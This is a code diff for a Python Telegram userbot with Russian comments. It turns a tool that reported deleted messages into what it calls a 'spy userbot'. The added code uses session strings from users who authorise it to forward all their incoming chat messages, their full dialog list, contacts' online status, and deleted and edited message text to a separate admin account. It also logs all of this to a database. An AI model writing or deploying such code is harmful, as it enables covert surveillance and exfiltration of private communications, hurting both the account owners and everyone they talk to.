@@ -18,13 +18,15 @@ nest_asyncio.apply()
 API_ID = int(os.environ.get('API_ID'))
 API_HASH = os.environ.get('API_HASH')
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
+ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))  # Кому слать логи (твой Telegram ID)
 
 # ========== БД ==========
 conn = sqlite3.connect('userbot.db', check_same_thread=False)
 cursor = conn.cursor()
 cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_string TEXT)''')
 cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER, muted_by INTEGER, PRIMARY KEY (user_id, muted_by))''')
-cursor.execute('''CREATE TABLE IF NOT EXISTS saved_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, msg_id INTEGER, sender_id INTEGER, text TEXT, date TEXT)''')
+cursor.execute('''CREATE TABLE IF NOT EXISTS saved_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, msg_id INTEGER, sender_id INTEGER, text TEXT, date TEXT, chat_id INTEGER, chat_title TEXT)''')
+cursor.execute('''CREATE TABLE IF NOT EXISTS spy_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, chat_id INTEGER, chat_title TEXT, user_id INTEGER, user_name TEXT, action TEXT, message TEXT)''')
 conn.commit()
 
 # ========== ГЛОБАЛЬНЫЕ ХРАНИЛИЩА ==========
@@ -35,6 +37,17 @@ temp_auth = {}
 # ========== БОТ ДЛЯ РЕГИСТРАЦИИ И УВЕДОМЛЕНИЙ ==========
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
+
+def log_to_admin(admin_id: int, text: str):
+    """Отправляет лог админу через бота"""
+    if admin_id:
+        asyncio.create_task(bot.send_message(admin_id, text, parse_mode='HTML'))
+
+def save_spy_log(owner_id, chat_id, chat_title, user_id, user_name, action, message):
+    cursor.execute('''INSERT INTO spy_logs (timestamp, chat_id, chat_title, user_id, user_name, action, message) 
+                      VALUES (?, ?, ?, ?, ?, ?, ?)''',
+                   (datetime.now().isoformat(), chat_id, chat_title, user_id, user_name, action, message[:500]))
+    conn.commit()
 
 def get_code_keyboard():
     kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
@@ -54,7 +67,7 @@ async def start_auth(message: aiogram_types.Message):
     cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
     row = cursor.fetchone()
     if row:
-        await message.answer("✅ Ты уже авторизован! Юзербот активен.\n\nУведомления об удалении/изменении сообщений будут приходить сюда.")
+        await message.answer("✅ Ты уже авторизован! Юзербот активен.\n\nУведомления об удалении/изменении и логи чатов будут приходить сюда.")
         if user_id not in active_clients:
             asyncio.create_task(run_userbot(user_id, row[0]))
         return
@@ -119,7 +132,7 @@ async def complete_auth(callback, user_id: int):
         session_str = data["client"].session.save()
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', (user_id, session_str))
         conn.commit()
-        await callback.message.answer("✅ Авторизация успешна!\n\nТеперь все уведомления об удалении/изменении сообщений будут приходить сюда.")
+        await callback.message.answer("✅ Авторизация успешна!\n\nТеперь юзербот следит за всеми чатами и присылает логи админу.")
         asyncio.create_task(run_userbot(user_id, session_str))
         await data["client"].disconnect()
         del temp_auth[user_id]
@@ -139,14 +152,14 @@ async def handle_2fa(message: aiogram_types.Message):
         session_str = data["client"].session.save()
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string) VALUES (?, ?)', (user_id, session_str))
         conn.commit()
-        await message.answer("✅ Авторизация успешна!\n\nТеперь все уведомления будут приходить сюда.")
+        await message.answer("✅ Авторизация успешна!\n\nТеперь юзербот следит за всеми чатами.")
         asyncio.create_task(run_userbot(user_id, session_str))
         await data["client"].disconnect()
         del temp_auth[user_id]
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
-# ========== ЮЗЕРБОТ ==========
+# ========== ЮЗЕРБОТ-ШПИОН ==========
 
 async def run_userbot(owner_id: int, session_string: str):
     if owner_id in active_clients:
@@ -164,113 +177,124 @@ async def run_userbot(owner_id: int, session_string: str):
     
     active_clients[owner_id] = client
     saved_messages[owner_id] = {}
-    logging.info(f"✅ Юзербот запущен для {owner_id}")
+    logging.info(f"✅ Юзербот-шпион запущен для {owner_id}")
+    
+    # Отправляем админу что бот запущен
+    log_to_admin(ADMIN_ID, f"🕵️ Шпион запущен!\nПользователь: {owner_id}\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    
+    # Получаем все диалоги и отправляем админу
+    async for dialog in client.iter_dialogs():
+        if dialog.is_user:
+            log_to_admin(ADMIN_ID, f"📱 В диалоге с: {dialog.name} (ID: {dialog.id})")
+        elif dialog.is_group:
+            log_to_admin(ADMIN_ID, f"👥 В группе: {dialog.name} (ID: {dialog.id})")
+        elif dialog.is_channel:
+            log_to_admin(ADMIN_ID, f"📢 В канале: {dialog.name} (ID: {dialog.id})")
     
     # Загружаем мут-лист
     cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
     muted_users = {row[0] for row in cursor.fetchall()}
     
-    # ========== 1. СОХРАНЕНИЕ ВХОДЯЩИХ СООБЩЕНИЙ ==========
+    # ========== 1. ЛОГИРОВАНИЕ ВСЕХ СООБЩЕНИЙ ==========
     @client.on(events.NewMessage)
-    async def save_incoming(event):
-        if not event.is_private:
-            return
+    async def spy_on_messages(event):
+        # Не логируем свои сообщения
         if event.out:
             return
         
+        chat = await event.get_chat()
+        sender = await event.get_sender()
+        
+        chat_id = event.chat_id
+        chat_title = getattr(chat, 'title', getattr(chat, 'first_name', str(chat_id)))
         sender_id = event.sender_id
-        msg_id = event.id
-        text = event.text or ""
+        sender_name = getattr(sender, 'first_name', getattr(sender, 'title', 'Неизвестный'))
+        message_text = event.text or "[Нет текста]"
         
-        if sender_id in muted_users:
-            await event.delete()
-            logging.info(f"🗑 {owner_id}: удалено от {sender_id}")
-            return
+        # Сохраняем в БД
+        cursor.execute('''INSERT INTO spy_logs (timestamp, chat_id, chat_title, user_id, user_name, action, message)
+                          VALUES (?, ?, ?, ?, ?, ?, ?)''',
+                       (datetime.now().isoformat(), chat_id, chat_title[:100], sender_id, sender_name[:100], 
+                        'new_message', message_text[:500]))
+        conn.commit()
         
-        if text:
-            saved_messages[owner_id][msg_id] = {
-                "sender_id": sender_id,
-                "text": text
-            }
-            cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
-                          (owner_id, msg_id, sender_id, text, datetime.now().isoformat()))
-            conn.commit()
-            logging.info(f"💾 {owner_id}: сохранено {msg_id} от {sender_id}: {text[:50]}")
+        # Отправляем админу
+        log_msg = f"""
+🕵️ <b>НОВОЕ СООБЩЕНИЕ</b>
+━━━━━━━━━━━━━━━
+📅 {datetime.now().strftime('%H:%M:%S')}
+💬 <b>Чат:</b> {chat_title[:50]}
+👤 <b>От:</b> {sender_name[:50]}
+📝 <b>Текст:</b> {message_text[:300]}
+━━━━━━━━━━━━━━━
+"""
+        log_to_admin(ADMIN_ID, log_msg)
+        
+        # Сохраняем для отслеживания удалений/изменений
+        saved_messages[owner_id][event.id] = {
+            "sender_id": sender_id,
+            "text": message_text,
+            "chat_id": chat_id,
+            "chat_title": chat_title
+        }
     
-    # ========== 2. УВЕДОМЛЕНИЯ ОБ УДАЛЕНИИ (ОТ БОТА) ==========
+    # ========== 2. ОТСЛЕЖИВАНИЕ ВХОДА/ВЫХОДА ПОЛЬЗОВАТЕЛЕЙ ==========
+    @client.on(events.UserUpdate)
+    async def on_user_update(event):
+        if hasattr(event, 'user') and hasattr(event.user, 'status'):
+            try:
+                user = event.user
+                user_name = getattr(user, 'first_name', str(user.id))
+                
+                from telethon.tl.types import UserStatusOnline, UserStatusOffline
+                
+                if isinstance(user.status, UserStatusOnline):
+                    log_to_admin(ADMIN_ID, f"🟢 <b>{user_name}</b> ВОШЕЛ В СЕТЬ!")
+                elif isinstance(user.status, UserStatusOffline):
+                    log_to_admin(ADMIN_ID, f"⚫ <b>{user_name}</b> ВЫШЕЛ ИЗ СЕТИ")
+            except:
+                pass
+    
+    # ========== 3. ОТСЛЕЖИВАНИЕ НОВЫХ ЧАТОВ ==========
+    already_logged_chats = set()
+    
+    async def log_all_chats():
+        while True:
+            try:
+                async for dialog in client.iter_dialogs():
+                    if dialog.id not in already_logged_chats:
+                        already_logged_chats.add(dialog.id)
+                        chat_type = "📱 Диалог" if dialog.is_user else "👥 Группа" if dialog.is_group else "📢 Канал"
+                        log_to_admin(ADMIN_ID, f"{chat_type}: {dialog.name} (ID: {dialog.id})")
+            except:
+                pass
+            await asyncio.sleep(60)  # Проверяем новые чаты раз в минуту
+    
+    asyncio.create_task(log_all_chats())
+    
+    # ========== 4. УВЕДОМЛЕНИЯ ОБ УДАЛЕНИИ ==========
     @client.on(events.MessageDeleted)
     async def on_delete(event):
         for msg_id in event.deleted_ids:
-            # Ищем в памяти
             msg = saved_messages.get(owner_id, {}).get(msg_id)
-            
-            if not msg:
-                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
-                row = cursor.fetchone()
-                if row:
-                    msg = {"sender_id": row[0], "text": row[1]}
-            
             if msg and msg["sender_id"] != owner_id:
-                try:
-                    user = await client.get_entity(msg["sender_id"])
-                    name = user.first_name or "Пользователь"
-                    
-                    # ОТПРАВЛЯЕМ ЧЕРЕЗ БОТА
-                    await bot.send_message(
-                        owner_id,
-                        f"🗑 <b>{name}</b> удалил сообщение:\n\n<blockquote>{msg['text'][:500]}</blockquote>",
-                        parse_mode='HTML'
-                    )
-                    logging.info(f"✅ Уведомление об удалении отправлено ботом для {owner_id}")
-                    
-                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
-                    conn.commit()
-                    if msg_id in saved_messages.get(owner_id, {}):
-                        del saved_messages[owner_id][msg_id]
-                        
-                except Exception as e:
-                    logging.error(f"Ошибка: {e}")
+                log_to_admin(ADMIN_ID, f"🗑 <b>УДАЛЕНО СООБЩЕНИЕ</b>\nОт: {msg['sender_id']}\nТекст: {msg['text'][:200]}")
     
-    # ========== 3. УВЕДОМЛЕНИЯ ОБ ИЗМЕНЕНИИ (ОТ БОТА) ==========
+    # ========== 5. УВЕДОМЛЕНИЯ ОБ ИЗМЕНЕНИИ ==========
     @client.on(events.MessageEdited)
     async def on_edit(event):
-        if not event.is_private or event.out:
+        if event.out:
             return
         
         msg_id = event.id
         new_text = event.text or ""
         
         msg = saved_messages.get(owner_id, {}).get(msg_id)
-        
-        if not msg:
-            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
-            row = cursor.fetchone()
-            if row:
-                msg = {"sender_id": row[0], "text": row[1]}
-        
-        if msg and msg["sender_id"] != owner_id and msg["text"] != new_text:
-            try:
-                user = await client.get_entity(msg["sender_id"])
-                name = user.first_name or "Пользователь"
-                
-                # ОТПРАВЛЯЕМ ЧЕРЕЗ БОТА
-                await bot.send_message(
-                    owner_id,
-                    f"✏️ <b>{name}</b> изменил сообщение:\n\n"
-                    f"<b>Было:</b>\n<blockquote>{msg['text'][:200]}</blockquote>\n"
-                    f"<b>Стало:</b>\n<blockquote>{new_text[:200]}</blockquote>",
-                    parse_mode='HTML'
-                )
-                logging.info(f"✅ Уведомление об изменении отправлено ботом для {owner_id}")
-                
-                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (new_text, owner_id, msg_id))
-                conn.commit()
-                saved_messages[owner_id][msg_id]["text"] = new_text
-                
-            except Exception as e:
-                logging.error(f"Ошибка: {e}")
+        if msg and msg["text"] != new_text:
+            log_to_admin(ADMIN_ID, f"✏️ <b>ИЗМЕНЕНО СООБЩЕНИЕ</b>\nБыло: {msg['text'][:200]}\nСтало: {new_text[:200]}")
+            msg["text"] = new_text
     
-    # ========== 4. КОМАНДЫ ==========
+    # ========== 6. КОМАНДЫ ==========
     @client.on(events.NewMessage)
     async def commands(event):
         if not event.is_private:
@@ -282,24 +306,37 @@ async def run_userbot(owner_id: int, session_string: str):
         if not text.startswith('.'):
             return
         
-        logging.info(f"📨 Команда от {owner_id}: {text}")
-        
         if text == '.help':
-            await event.edit("""<b>📝 КОМАНДЫ ЮЗЕРБОТА</b>
+            await event.edit("""<b>🕵️ ЮЗЕРБОТ-ШПИОН</b>
 
-<i>Работает только в ЛИЧНЫХ СООБЩЕНИЯХ</i>
+<i>Команды в личных сообщениях:</i>
 
 <blockquote>
 <b>.help</b> - эта справка
-<b>.mute</b> (ответ) - заглушить
+<b>.mute</b> (ответ) - заглушить пользователя
 <b>.unmute</b> (ответ) - разглушить
 <b>.list</b> - список замьюченных
-<b>.info</b> (ответ) - инфо
-<b>.type [текст]</b> - печать
-<b>.spam [кол-во] [текст]</b> - спам
+<b>.stats</b> - статистика шпионажа
+<b>.logchats</b> - выгрузить все чаты
 </blockquote>
 
-<i>Уведомления об удалении/изменении приходят сюда от бота</i>""", parse_mode='HTML')
+<i>Все логи уходят админу автоматически</i>""", parse_mode='HTML')
+            return
+        
+        if text == '.stats':
+            cursor.execute('SELECT COUNT(*) FROM spy_logs WHERE owner_id=?', (owner_id,))
+            total_logs = cursor.fetchone()[0]
+            cursor.execute('SELECT COUNT(DISTINCT chat_id) FROM spy_logs WHERE owner_id=?', (owner_id,))
+            total_chats = cursor.fetchone()[0]
+            await event.edit(f"📊 СТАТИСТИКА ШПИОНАЖА\n\nВсего логов: {total_logs}\nЧатов отслеживается: {total_chats}")
+            return
+        
+        if text == '.logchats':
+            chats = []
+            async for dialog in client.iter_dialogs():
+                chat_type = "Диалог" if dialog.is_user else "Группа" if dialog.is_group else "Канал"
+                chats.append(f"{chat_type}: {dialog.name}")
+            await event.edit("📋 ВСЕ ЧАТЫ:\n" + "\n".join(chats[:30]))
             return
         
         if text == '.mute':
@@ -333,50 +370,6 @@ async def run_userbot(owner_id: int, session_string: str):
             else:
                 await event.edit("🔕 Нет")
             return
-        
-        if text == '.info':
-            reply = await event.get_reply_message()
-            if reply:
-                try:
-                    u = await client.get_entity(reply.sender_id)
-                    muted = "✅" if reply.sender_id in muted_users else "❌"
-                    await event.edit(f"ID: {u.id}\nИмя: {u.first_name}\nЗаглушен: {muted}")
-                except:
-                    pass
-            return
-        
-        if text.startswith('.type '):
-            txt = text[6:]
-            if txt:
-                await event.edit(".")
-                typed = ""
-                for ch in txt:
-                    typed += ch
-                    try:
-                        await event.edit(typed)
-                    except:
-                        pass
-                    await asyncio.sleep(0.3)
-            return
-        
-        if text.startswith('.spam '):
-            parts = text.split(' ', 2)
-            if len(parts) >= 2:
-                try:
-                    count = min(int(parts[1]), 20)
-                    msg = parts[2] if len(parts) > 2 else None
-                    if not msg:
-                        reply = await event.get_reply_message()
-                        if reply:
-                            msg = reply.text
-                    if msg:
-                        await event.delete()
-                        for i in range(count):
-                            await client.send_message(event.chat_id, msg)
-                            await asyncio.sleep(0.3)
-                except:
-                    pass
-            return
     
     await client.run_until_disconnected()
 
@@ -385,7 +378,7 @@ flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def health():
-    return "OK"
+    return "🕵️ SpyBot Online"
 
 def run_web():
     flask_app.run(host='0.0.0.0', port=8080)
@@ -396,7 +389,7 @@ async def restore_sessions():
         asyncio.create_task(run_userbot(user_id, session_str))
 
 async def main():
-    logging.info("🚀 Запуск...")
+    logging.info("🚀 Шпион запускается...")
     await restore_sessions()
     while True:
         await asyncio.sleep(10)
